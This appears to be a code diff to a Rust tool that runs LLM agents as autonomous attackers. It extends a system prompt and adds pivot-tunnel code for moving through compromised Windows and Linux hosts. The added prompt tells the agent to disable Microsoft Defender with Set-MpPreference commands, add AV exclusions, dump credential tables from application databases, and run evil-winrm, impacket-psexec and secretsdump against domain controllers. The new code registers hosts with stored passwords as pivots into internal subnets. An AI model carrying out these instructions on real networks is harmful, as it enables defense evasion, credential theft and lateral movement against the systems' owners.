@@ -2816,7 +2816,7 @@ pub async fn run_greybox(cfg: RunConfig, lib: &Library, pool: &ModelPool, tx: Se
     finish(cfg, lib, pool, recon, transcript, findings, selected, &mut rl, crate::grounding::GroundMode::Either, context, tx).await
 }
 
-const CHAIN_SYS: &str = "You are a post-exploitation & attack-chaining specialist. You are given ONE confirmed foothold plus any loot already gathered. DECIDE the most promising directions to expand from THIS foothold and pursue them with real tools: post-exploitation (loot credentials/tokens/keys/config/source), credential reuse, privilege escalation (horizontal AND vertical), lateral movement to adjacent services/hosts, data exfiltration, and reaching NEW attack surface the foothold exposes (e.g. SSRF→cloud metadata creds→IAM, SQLi→DB dump→credential reuse→admin, arbitrary file read→secrets→RCE, IDOR→account takeover, auth bypass→internal APIs). PROVE each escalated step with a real tool receipt. Report ONLY NEW findings beyond the input, plus any new loot you discovered (creds, tokens, hosts, internal endpoints) so later stages can reuse it. Authorized engagement; never destructive/DoS.";
+const CHAIN_SYS: &str = "You are a post-exploitation & attack-chaining specialist. You are given ONE confirmed foothold plus any loot already gathered. DECIDE the most promising directions to expand from THIS foothold and pursue them with real tools: post-exploitation (loot credentials/tokens/keys/config/source), credential reuse, privilege escalation (horizontal AND vertical), lateral movement to adjacent services/hosts, data exfiltration, and reaching NEW attack surface the foothold exposes (e.g. SSRF→cloud metadata creds→IAM, SQLi→DB dump→credential reuse→admin, arbitrary file read→secrets→RCE, IDOR→account takeover, auth bypass→internal APIs). PROVE each escalated step with a real tool receipt. Report ONLY NEW findings beyond the input, plus any new loot you discovered (creds, tokens, hosts, internal endpoints) so later stages can reuse it. AD/INTERNAL PIVOT TRADECRAFT: (a) a compromised domain-joined host usually ROUTES to internal/forest subnets that are unreachable from the operator box — run tooling FROM that host, or start ONE clean SOCKS relay through it (single hop; stacking forwards corrupts SMB/DRSUAPI) and run tools locally over the proxy. (b) If exec runs but output comes back EMPTY/truncated, the host AV/EDR is deleting the dropped output file — do NOT conclude failure. Reason from what you HOLD: if you already have local admin / SYSTEM on that host, you OWN it, so neuter the AV yourself (`Set-MpPreference -DisableRealtimeMonitoring $true` / `-DisableIOAVProtection $true` / `-DisableScriptScanning $true`, or add an `Add-MpPreference -ExclusionPath`) and re-run; otherwise switch to `evil-winrm` (interactive, output streams over WinRM) or stage in a path the host already excludes (e.g. C:\\Tools) and read from there. (c) APPLICATION CREDENTIAL STORES are often the fastest path to Domain Admin: with any DB read access (e.g. MSSQL `sa`/mapped login), enumerate non-system databases for credential tables (columns like pass/cred/secret/pwd) and DUMP them — one forest's app DB commonly stores the NEXT forest's admin and the forest-root DA. (d) Prefer a DIRECT credential login to a domain controller (`evil-winrm`/`impacket-psexec` with a recovered admin) over fighting a tunnel/AV for a DCSync — then `impacket-secretsdump` once you hold a DA. Authorized engagement; never destructive/DoS.";
 
 /// One orchestration round: take the confirmed findings and try to chain them
 /// into higher-impact follow-ups, reusing the recon/auth context. Returns the
@@ -2846,6 +2846,47 @@ fn sev_rank(sev: &str) -> u8 {
         x if x.starts_with("low") => 1,
         _ => 0,
     }
+}
+
+/// Extract IPv4 addresses from a string (endpoint, evidence, loot).
+fn extract_ips(text: &str) -> Vec<String> {
+    let mut ips = Vec::new();
+    // Match patterns like 10.0.1.6, 192.168.1.1, etc.
+    let mut i = 0;
+    let bytes = text.as_bytes();
+    while i < bytes.len() {
+        if bytes[i].is_ascii_digit() {
+            let start = i;
+            while i < bytes.len() && (bytes[i].is_ascii_digit() || bytes[i] == b'.') {
+                i += 1;
+            }
+            let candidate = &text[start..i];
+            let parts: Vec<&str> = candidate.split('.').collect();
+            if parts.len() == 4 && parts.iter().all(|p| p.parse::<u8>().is_ok()) {
+                let ip = candidate.to_string();
+                if !ips.contains(&ip) {
+                    ips.push(ip);
+                }
+            }
+        } else {
+            i += 1;
+        }
+    }
+    ips
+}
+
+/// Extract subnet CIDRs mentioned in recon text (IPs found are grouped into /24s).
+fn extract_subnets_from_recon(recon: &str) -> Vec<String> {
+    let mut subnets = std::collections::HashSet::new();
+    for ip in extract_ips(recon) {
+        if let Ok(v4) = ip.parse::<std::net::Ipv4Addr>() {
+            if v4.is_private() {
+                let o = v4.octets();
+                subnets.insert(format!("{}.{}.{}.0/24", o[0], o[1], o[2]));
+            }
+        }
+    }
+    subnets.into_iter().collect()
 }
 
 /// Max footholds expanded per round (keeps token cost bounded).
@@ -2990,6 +3031,108 @@ async fn attack_chain(pool: &ModelPool, cfg: &RunConfig, recon: &str,
     let recipe_block = if recipes.is_empty() { String::new() } else { format!("KNOWN CHAIN RECIPES (apply any that fit):\n{recipes}\n\n") };
     let recon_ctx: String = recon.chars().take(2000).collect();
 
+    // --- Pivot proxy: set up PivotManager for multi-hop subnet routing ---
+    let pivot_enabled = cfg.pivot_proxy.as_deref()
+        .map(|v| !v.eq_ignore_ascii_case("off"))
+        .unwrap_or(false);
+    let pivot_mgr = crate::pivot::PivotManager::new();
+    if pivot_enabled {
+        // Register directly reachable subnets from the target.
+        let target_subnet = {
+            let octets: Vec<&str> = cfg.target.split('.').collect();
+            if octets.len() >= 3 {
+                format!("{}.{}.{}.0/24", octets[0], octets[1], octets[2])
+            } else {
+                String::new()
+            }
+        };
+        if !target_subnet.is_empty() {
+            pivot_mgr.set_direct_subnets(vec![target_subnet]).await;
+        }
+
+        // Manual pivot registration: `host:domain:user:pass`.
+        if let Some(spec) = cfg.pivot_proxy.as_deref() {
+            let parts: Vec<&str> = spec.split(':').collect();
+            if parts.len() >= 4 {
+                let pivot_subnets = extract_subnets_from_recon(recon);
+                let _ = tx.send(format!(
+                    "🔀 pivot: manual pivot registered — {} ({}@{}) for subnets: {}",
+                    parts[0], parts[2], parts[1], pivot_subnets.join(", ")
+                )).await;
+                pivot_mgr.register_pivot(crate::pivot::PivotHost {
+                    address: parts[0].to_string(),
+                    reachable_subnets: pivot_subnets,
+                    access: crate::pivot::PivotAccess::WinRm {
+                        domain: parts[1].to_string(),
+                        user: parts[2].to_string(),
+                        password: parts[3..].join(":"),
+                    },
+                    os: crate::pivot::PivotOs::Windows,
+                    has_chisel: false,
+                    has_ligolo: false,
+                    has_ssh: false,
+                }).await;
+            }
+        }
+
+        // Auto-register the engagement target as a pivot if we have credentials.
+        if cfg.pivot_proxy.as_deref().map(|v| v.eq_ignore_ascii_case("auto")).unwrap_or(false) {
+            if let Some(creds_path) = cfg.creds_file.as_deref() {
+                if let Some(creds) = crate::creds::Creds::load(std::path::Path::new(creds_path)) {
+                    if let Some(win) = &creds.win {
+                        if !win.host.is_empty() && !win.user.is_empty() {
+                            let pivot_subnets = extract_subnets_from_recon(recon);
+                            if !pivot_subnets.is_empty() {
+                                let _ = tx.send(format!(
+                                    "🔀 pivot: auto-registering {} as pivot for subnets: {}",
+                                    win.host, pivot_subnets.join(", ")
+                                )).await;
+                                pivot_mgr.register_pivot(crate::pivot::PivotHost {
+                                    address: win.host.clone(),
+                                    reachable_subnets: pivot_subnets,
+                                    access: crate::pivot::PivotAccess::WinRm {
+                                        domain: win.domain.clone(),
+                                        user: win.user.clone(),
+                                        password: win.password.clone(),
+                                    },
+                                    os: crate::pivot::PivotOs::Windows,
+                                    has_chisel: false,
+                                    has_ligolo: false,
+                                    has_ssh: false,
+                                }).await;
+                            }
+                        }
+                    }
+                    if let Some(ssh) = &creds.ssh {
+                        if !ssh.host.is_empty() && !ssh.user.is_empty() {
+                            let pivot_subnets = extract_subnets_from_recon(recon);
+                            if !pivot_subnets.is_empty() {
+                                let _ = tx.send(format!(
+                                    "🔀 pivot: auto-registering {} (SSH) as pivot for subnets: {}",
+                                    ssh.host, pivot_subnets.join(", ")
+                                )).await;
+                                pivot_mgr.register_pivot(crate::pivot::PivotHost {
+                                    address: ssh.host.clone(),
+                                    reachable_subnets: pivot_subnets,
+                                    access: crate::pivot::PivotAccess::Ssh {
+                                        user: ssh.user.clone(),
+                                        password: if ssh.password.is_empty() { None } else { Some(ssh.password.clone()) },
+                                        key: if ssh.key.is_empty() { None } else { Some(ssh.key.clone()) },
+                                    },
+                                    os: crate::pivot::PivotOs::Linux,
+                                    has_chisel: false,
+                                    has_ligolo: false,
+                                    has_ssh: true,
+                                }).await;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        let _ = tx.send("🔀 pivot proxy engine enabled".to_string()).await;
+    }
+
     let mut all_new: Vec<Finding> = Vec::new();
     let mut loot: Vec<String> = Vec::new();
     let mut round_summaries: Vec<String> = Vec::new();
@@ -3049,10 +3192,53 @@ async fn attack_chain(pool: &ModelPool, cfg: &RunConfig, recon: &str,
         // Directives re-read every round: they carry the live attack-graph
         // context the last checkpoint published.
         let round_directives = operator_directives(cfg);
+
+        // --- Pivot: for each seed, check if its target subnet needs a tunnel ---
+        let mut pivot_ctx = String::new();
+        if pivot_enabled {
+            let mut target_ips: Vec<String> = Vec::new();
+            for (seed, _) in &seeds {
+                for ip in extract_ips(&seed.endpoint) {
+                    if !target_ips.contains(&ip) { target_ips.push(ip); }
+                }
+                for ip in extract_ips(&seed.evidence) {
+                    if !target_ips.contains(&ip) { target_ips.push(ip); }
+                }
+            }
+            for l in &loot_snapshot {
+                for ip in extract_ips(l) {
+                    if !target_ips.contains(&ip) { target_ips.push(ip); }
+                }
+            }
+            // Try to set up tunnels for unreachable IPs.
+            for ip in &target_ips {
+                if pivot_mgr.needs_pivot(ip).await {
+                    for port in [445u16, 88, 389, 5985, 3389, 1433, 135] {
+                        match pivot_mgr.ensure_tunnel(ip, port, tx).await {
+                            Ok(_) => break,
+                            Err(_) => continue,
+                        }
+                    }
+                }
+            }
+            // Collect pivot instructions for chain agents.
+            for ip in &target_ips {
+                let instr = pivot_mgr.agent_instructions(ip).await;
+                if !instr.is_empty() && !pivot_ctx.contains(&instr) {
+                    pivot_ctx.push_str(&instr);
+                }
+            }
+            let summary = pivot_mgr.summary().await;
+            if summary != "no active pivot tunnels" {
+                pivot_ctx.push_str(&format!("\nACTIVE PIVOTS: {summary}\n"));
+            }
+        }
+
+        let pivot_ctx_clone = pivot_ctx.clone();
         let results: Vec<(Vec<Finding>, Vec<String>)> = stream::iter(seeds)
             .map(|(seed, step)| {
-                let (dir, rc, rb, ls, txc) = (round_directives.clone(), recon_ctx.clone(), format!("{recipe_block}{step}"), loot_snapshot.clone(), tx.clone());
-                async move { chain_from_seed(pool, &cfg.target, &dir, &rc, &rb, &seed, &ls, round, max_rounds, &txc).await }
+                let (dir, rc, rb, ls, pc, txc) = (round_directives.clone(), recon_ctx.clone(), format!("{recipe_block}{step}"), loot_snapshot.clone(), pivot_ctx_clone.clone(), tx.clone());
+                async move { chain_from_seed(pool, &cfg.target, &dir, &rc, &rb, &seed, &ls, round, max_rounds, &pc, &txc).await }
             })
             .buffer_unordered(4)
             .collect()
@@ -3133,7 +3319,7 @@ async fn attack_chain(pool: &ModelPool, cfg: &RunConfig, recon: &str,
 #[allow(clippy::too_many_arguments)]
 async fn chain_from_seed(pool: &ModelPool, target: &str, directives: &str, recon_ctx: &str,
                          recipe_block: &str, seed: &Finding, loot: &[String],
-                         round: usize, max: usize, tx: &Sender<String>) -> (Vec<Finding>, Vec<String>) {
+                         round: usize, max: usize, pivot_ctx: &str, tx: &Sender<String>) -> (Vec<Finding>, Vec<String>) {
     if pool.stop_exploiting() {
         return (vec![], vec![]);
     }
@@ -3144,11 +3330,12 @@ async fn chain_from_seed(pool: &ModelPool, target: &str, directives: &str, recon
     };
     let short: String = seed.title.chars().take(28).collect();
     let c2 = crate::c2::agent_context().await;
+    let pivot_block = if pivot_ctx.is_empty() { String::new() } else { format!("\n{pivot_ctx}\n") };
     let user = format!(
-        "AUTHORIZED engagement on {target}.\n\n{directives}{react}{depth}{decision}{chain}{safety}{doctrine}{c2}\
+        "AUTHORIZED engagement on {target}.\n\n{directives}{react}{depth}{decision}{chain}{safety}{doctrine}{c2}{pivot_block}\
          FOOTHOLD TO EXPAND (round {round}/{max}):\n- [{}] {} @ {} ({})\n  payload: {}\n  evidence: {}\n\n\
          LOOT GATHERED (reuse it):\n{loot_block}\n\n{recipe_block}RECON:\n{recon_ctx}\n\n\
-         From THIS foothold, DECIDE the best directions and PROVE new impact — post-exploitation (loot creds/keys/config/source), credential reuse, privilege escalation (horizontal & vertical), lateral movement to adjacent services/hosts, data exfiltration, and NEW attack surface it exposes. Every claim needs a real tool receipt.\n\n\
+         From THIS foothold, DECIDE the best directions and PROVE new impact — post-exploitation (loot creds/keys/config/source), credential reuse, privilege escalation (horizontal & vertical), lateral movement to adjacent services/hosts, data exfiltration, and NEW attack surface it exposes. When targeting hosts on a different subnet, USE the pivot proxy instructions above — your tools run on the operator box, not on the compromised host, so without the proxy you cannot reach internal subnets. Every claim needs a real tool receipt.\n\n\
          Reply ONLY JSON: {{\"findings\":[{{id,title,severity,cwe,endpoint,payload,evidence,impact,remediation,confidence}}],\"loot\":[\"cred:user:pass@host\",\"token:...\",\"host:10.0.0.5\",\"endpoint:/internal/api\"]}} (empty arrays are fine).",
         seed.severity, seed.title, seed.endpoint, seed.cwe, seed.payload, seed.evidence,
         react = REACT_DOCTRINE, depth = DEPTH_DOCTRINE, decision = DECISION_DOCTRINE, chain = CHAIN_DOCTRINE, safety = SAFETY_DOCTRINE, doctrine = tool_doctrine(pool.mcp_config.is_some()),
